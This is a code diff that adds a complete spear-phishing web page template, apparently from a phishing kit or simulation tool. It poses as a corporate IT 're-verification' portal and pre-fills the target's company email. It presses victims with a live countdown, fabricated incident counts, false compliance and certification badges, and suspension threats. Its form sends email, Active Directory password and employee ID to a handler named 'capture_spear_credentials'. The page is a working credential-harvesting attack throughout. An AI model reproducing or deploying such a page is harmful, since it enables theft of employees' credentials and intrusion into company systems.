@@ -1,0 +1,501 @@
+{% extends "base.html" %}
+
+{% block title %}Secure Portal - {{ target|title }} Login{% endblock %}
+
+{% block content %}
+<div class="spear-container">
+    <div class="spear-header">
+        <div class="company-logo">
+            <div class="logo-placeholder">🏢</div>
+            <h2>SecureCorp Portal</h2>
+        </div>
+        <div class="security-badge">
+            <span class="security-icon">🔒</span>
+            <span>Verified Secure</span>
+        </div>
+    </div>
+    
+    <div class="spear-alert">
+        <div class="alert-content">
+            <h3>🚨 Security Notice for {{ target|title }}s</h3>
+            <p><strong>Action Required:</strong> Due to recent security updates, all {{ target }} accounts must be re-verified immediately.</p>
+            <div class="urgency-bar">
+                <div class="urgency-fill"></div>
+            </div>
+            <p class="deadline">Verification Deadline: <span class="countdown" id="deadline">Today 11:59 PM</span></p>
+        </div>
+    </div>
+    
+    <div class="personalized-content">
+        <div class="greeting">
+            <h4>Hello {{ target|title }},</h4>
+            <p>Your account <strong>{{ target }}@company.com</strong> requires immediate verification due to our enhanced security protocols.</p>
+        </div>
+        
+        <div class="threat-details">
+            <h5>Recent Security Incidents in Your Department:</h5>
+            <ul class="incident-list">
+                <li>📧 3 phishing attempts blocked this week</li>
+                <li>🔓 2 unauthorized access attempts detected</li>
+                <li>⚠️ 1 data breach attempt prevented</li>
+            </ul>
+        </div>
+    </div>
+    
+    <div class="spear-form-container">
+        <h3>Re-verify Your Corporate Account</h3>
+        <div class="form-notice">
+            <p>Enter your current credentials to maintain access to corporate resources</p>
+        </div>
+        
+        <form method="POST" action="{{ url_for('capture_spear_credentials') }}" class="spear-form">
+            <input type="hidden" name="target" value="{{ target }}">
+            
+            <div class="form-group">
+                <label>Corporate Email Address</label>
+                <input 
+                    type="email" 
+                    name="email" 
+                    class="spear-input"
+                    placeholder="{{ target }}@company.com"
+                    required
+                    value="{{ target }}@company.com"
+                >
+                <div class="input-note">Pre-filled based on your department</div>
+            </div>
+            
+            <div class="form-group">
+                <label>Current Password</label>
+                <input 
+                    type="password" 
+                    name="password" 
+                    class="spear-input"
+                    placeholder="Enter your current password"
+                    required
+                >
+                <div class="password-requirements">
+                    <small>Must match your current Active Directory password</small>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label>Employee ID</label>
+                <input 
+                    type="text" 
+                    name="employee_id" 
+                    class="spear-input"
+                    placeholder="EMP{{ range(1000, 9999) | random }}"
+                    required
+                >
+            </div>
+            
+            <div class="compliance-notice">
+                <div class="compliance-icon">⚖️</div>
+                <p><strong>Compliance Requirement:</strong> This verification is mandatory under our SOC 2 Type II certification and must be completed by all {{ target }}s.</p>
+            </div>
+            
+            <button type="submit" class="spear-verify-btn">
+                🔐 Verify Account & Maintain Access
+            </button>
+            
+            <div class="consequences">
+                <p><strong>⚠️ Important:</strong> Accounts not verified by the deadline will be:</p>
+                <ul>
+                    <li>Temporarily suspended from all systems</li>
+                    <li>Removed from active project assignments</li>
+                    <li>Required to complete security training</li>
+                </ul>
+            </div>
+        </form>
+    </div>
+    
+    <div class="trust-indicators">
+        <div class="indicator">
+            <span class="indicator-icon">🛡️</span>
+            <span>SSL Secured</span>
+        </div>
+        <div class="indicator">
+            <span class="indicator-icon">🔐</span>
+            <span>Enterprise Grade</span>
+        </div>
+        <div class="indicator">
+            <span class="indicator-icon">✅</span>
+            <span>ISO 27001 Certified</span>
+        </div>
+    </div>
+    
+    <div class="footer-disclaimer">
+        <p><small>This is an automated security notification from IT Security Department. For questions, contact: security@company.com | Phone: (555) 123-4567</small></p>
+        <p><small>© 2024 SecureCorp Technologies. All rights reserved. | Privacy Policy | Terms of Service</small></p>
+    </div>
+</div>
+
+<style>
+.spear-container {
+    max-width: 700px;
+    margin: 20px auto;
+    background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+    border-radius: 12px;
+    overflow: hidden;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+}
+
+.spear-header {
+    background: linear-gradient(135deg, #2c3e50, #34495e);
+    color: white;
+    padding: 25px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+}
+
+.company-logo {
+    display: flex;
+    align-items: center;
+    gap: 15px;
+}
+
+.logo-placeholder {
+    font-size: 40px;
+    background: rgba(255, 255, 255, 0.2);
+    border-radius: 8px;
+    padding: 10px;
+}
+
+.company-logo h2 {
+    margin: 0;
+    font-weight: 600;
+}
+
+.security-badge {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    background: rgba(46, 204, 113, 0.2);
+    padding: 8px 16px;
+    border-radius: 20px;
+    border: 1px solid #2ecc71;
+}
+
+.security-icon {
+    font-size: 16px;
+}
+
+.spear-alert {
+    background: linear-gradient(135deg, #e74c3c, #c0392b);
+    color: white;
+    padding: 25px;
+    text-align: center;
+}
+
+.spear-alert h3 {
+    margin-bottom: 15px;
+    font-size: 1.4em;
+}
+
+.urgency-bar {
+    background: rgba(255, 255, 255, 0.3);
+    height: 8px;
+    border-radius: 4px;
+    margin: 20px 0;
+    overflow: hidden;
+}
+
+.urgency-fill {
+    background: #f39c12;
+    height: 100%;
+    width: 75%;
+    animation: urgency-pulse 2s infinite;
+}
+
+@keyframes urgency-pulse {
+    0%, 100% { width: 75%; }
+    50% { width: 85%; }
+}
+
+.deadline {
+    font-weight: bold;
+    font-size: 1.1em;
+}
+
+.countdown {
+    background: rgba(0, 0, 0, 0.3);
+    padding: 5px 12px;
+    border-radius: 4px;
+    animation: blink 1s infinite;
+}
+
+@keyframes blink {
+    0%, 50% { opacity: 1; }
+    51%, 100% { opacity: 0.7; }
+}
+
+.personalized-content {
+    padding: 30px;
+    background: white;
+}
+
+.greeting h4 {
+    color: #2c3e50;
+    margin-bottom: 10px;
+    font-size: 1.3em;
+}
+
+.greeting p {
+    color: #5a6c7d;
+    line-height: 1.6;
+}
+
+.threat-details {
+    margin-top: 25px;
+    background: #fff3cd;
+    padding: 20px;
+    border-radius: 8px;
+    border-left: 4px solid #ffc107;
+}
+
+.threat-details h5 {
+    color: #856404;
+    margin-bottom: 15px;
+}
+
+.incident-list {
+    list-style: none;
+    padding: 0;
+}
+
+.incident-list li {
+    margin: 8px 0;
+    color: #856404;
+    font-weight: 500;
+}
+
+.spear-form-container {
+    background: white;
+    padding: 30px;
+    border-top: 1px solid #dee2e6;
+}
+
+.spear-form-container h3 {
+    color: #2c3e50;
+    text-align: center;
+    margin-bottom: 20px;
+}
+
+.form-notice {
+    background: #e3f2fd;
+    padding: 15px;
+    border-radius: 6px;
+    margin-bottom: 25px;
+    text-align: center;
+}
+
+.form-notice p {
+    margin: 0;
+    color: #1565c0;
+    font-weight: 500;
+}
+
+.form-group {
+    margin-bottom: 20px;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 8px;
+    color: #2c3e50;
+    font-weight: 600;
+}
+
+.spear-input {
+    width: 100%;
+    padding: 14px;
+    border: 2px solid #dee2e6;
+    border-radius: 6px;
+    font-size: 16px;
+    transition: all 0.3s;
+    background: #f8f9fa;
+}
+
+.spear-input:focus {
+    border-color: #007bff;
+    background: white;
+    outline: none;
+    box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.1);
+}
+
+.input-note {
+    font-size: 12px;
+    color: #6c757d;
+    margin-top: 5px;
+    font-style: italic;
+}
+
+.password-requirements {
+    margin-top: 5px;
+}
+
+.password-requirements small {
+    color: #6c757d;
+}
+
+.compliance-notice {
+    background: #f8f9fa;
+    border: 1px solid #dee2e6;
+    border-radius: 8px;
+    padding: 20px;
+    margin: 25px 0;
+    display: flex;
+    align-items: flex-start;
+    gap: 15px;
+}
+
+.compliance-icon {
+    font-size: 24px;
+    flex-shrink: 0;
+}
+
+.compliance-notice p {
+    margin: 0;
+    color: #495057;
+    line-height: 1.5;
+}
+
+.spear-verify-btn {
+    width: 100%;
+    background: linear-gradient(135deg, #007bff, #0056b3);
+    color: white;
+    border: none;
+    padding: 18px;
+    font-size: 18px;
+    font-weight: 600;
+    border-radius: 8px;
+    cursor: pointer;
+    transition: all 0.3s;
+    margin-bottom: 20px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+}
+
+.spear-verify-btn:hover {
+    background: linear-gradient(135deg, #0056b3, #004085);
+    transform: translateY(-2px);
+    box-shadow: 0 8px 25px rgba(0, 123, 255, 0.3);
+}
+
+.consequences {
+    background: #fff3cd;
+    border: 1px solid #ffeaa7;
+    border-radius: 6px;
+    padding: 20px;
+    margin-top: 20px;
+}
+
+.consequences p {
+    margin-bottom: 10px;
+    color: #856404;
+    font-weight: 600;
+}
+
+.consequences ul {
+    margin: 10px 0 0 20px;
+    color: #856404;
+}
+
+.consequences li {
+    margin: 5px 0;
+}
+
+.trust-indicators {
+    background: #f8f9fa;
+    padding: 20px;
+    display: flex;
+    justify-content: center;
+    gap: 30px;
+    border-top: 1px solid #dee2e6;
+}
+
+.indicator {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    color: #28a745;
+    font-weight: 500;
+}
+
+.indicator-icon {
+    font-size: 18px;
+}
+
+.footer-disclaimer {
+    background: #2c3e50;
+    color: #bdc3c7;
+    padding: 20px;
+    text-align: center;
+}
+
+.footer-disclaimer p {
+    margin: 5px 0;
+    line-height: 1.4;
+}
+
+/* Responsive Design */
+@media (max-width: 768px) {
+    .spear-container {
+        margin: 10px;
+    }
+    
+    .spear-header {
+        flex-direction: column;
+        gap: 15px;
+        text-align: center;
+    }
+    
+    .trust-indicators {
+        flex-direction: column;
+        gap: 15px;
+    }
+    
+    .compliance-notice {
+        flex-direction: column;
+        text-align: center;
+    }
+}
+</style>
+
+<script>
+// Realistic deadline countdown
+function updateDeadline() {
+    const now = new Date();
+    const deadline = new Date();
+    deadline.setHours(23, 59, 59, 999); // Set to 11:59 PM today
+    
+    const timeLeft = deadline - now;
+    
+    if (timeLeft > 0) {
+        const hours = Math.floor(timeLeft / (1000 * 60 * 60));
+        const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+        
+        document.getElementById('deadline').textContent = 
+            `Today ${hours}h ${minutes}m remaining`;
+    } else {
+        document.getElementById('deadline').textContent = "DEADLINE PASSED";
+        document.getElementById('deadline').style.color = "#e74c3c";
+    }
+}
+
+// Update every minute
+setInterval(updateDeadline, 60000);
+updateDeadline(); // Initial call
+
+// Pre-fill employee ID with realistic format
+document.addEventListener('DOMContentLoaded', function() {
+    const empIdField = document.querySelector('input[name="employee_id"]');
+    if (empIdField) {
+        const randomId = 'EMP' + Math.floor(Math.random() * 9000 + 1000);
+        empIdField.placeholder = randomId;
+    }
+});
+</script>
+{% endblock %}
